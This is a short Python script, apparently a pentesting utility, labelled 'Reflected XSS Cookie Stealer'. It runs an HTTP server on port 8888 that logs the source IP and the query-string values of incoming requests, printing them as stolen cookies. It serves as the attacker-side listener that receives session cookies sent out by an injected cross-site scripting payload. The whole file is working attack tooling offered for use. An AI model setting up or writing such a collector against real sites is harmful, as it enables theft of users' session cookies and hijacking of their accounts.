#!/usr/bin/python3
# Usage: python3 cooxss.py

import time
from datetime import datetime
from signal import signal, SIGINT
from sys import exit
from termcolor import colored
from pwn import *
from http.server import BaseHTTPRequestHandler as HTTPReq, HTTPServer
from urllib.parse import urlparse, parse_qs

start_time = time.time()

def keyHandler(sig, frame):
    print("")
    log.failure(colored("Ctrl + C pressed. Program ended...\n", "red"))
    print(f"Total elapsed time: {int(time.time() - start_time)} seconds")
    sys.exit(1)
signal.signal(signal.SIGINT, keyHandler)

def showBanner():
    print(colored("""                                          
               :=++***+=.                     
           :+%@#+-::::-*%%%*+=.               
         -%@+:       .. .%@%+*%@+.            
        *@+    ..+#:           :*@*.          
      :%#.      #*@=    =        :@%.         
      *@    .          :    .=-   .@%         
     *@=        .        . -%#@    @@.        
    :@# :   :   .           -=.    #@.        
    +@+ :   .      . .-:    -.   . #@-        
    -@#  ..         =@#@#   .      @@:        
    .@@  %*@@ .      .=#:       : :@%         
     #@= :==.                 :. .#@+         
      *@*  .   . :          : ...+@#          
       =@#:  :    :   .  .   : :*@*           
        :*@%=:. ....**+  .  :-+@%-            
           =*#%@%*+*#%@%+*%@%#+:              
                :===***+-:.
  """, "yellow"))
    print("\t\tReflected XSS Cookie Stealer" + colored("\n\t\t\t\t@brunosgio\n", "yellow"))

def startServer():
    lhost = '0.0.0.0'
    lport = 8888
    server = HTTPServer((lhost, lport), RequestHandler)
    log.success(colored(f"HTTP server started on host {lhost}:{lport}", 'green'))
    server.serve_forever()

class RequestHandler(HTTPReq):
    def do_GET(self):
        query_components = parse_qs(urlparse(self.path).query) 
        print(f"\n{datetime.now().strftime('%Y-%m-%d %I:%M %p')}", end=' - ')
        print(f"{self.client_address[0]}")
        for k, v in query_components.items():
            print(colored(f"Cookie: ", 'yellow') + f"{str(v).lstrip('[').rstrip(']')}")
        print(colored("-------------------"*3, "yellow"))
        return
    def log_message(self, format, *args):
        return

def main():
    try:
        showBanner()
        startServer()
    except Exception as e:
        log.error(str(e))

if __name__ == '__main__':
    main()
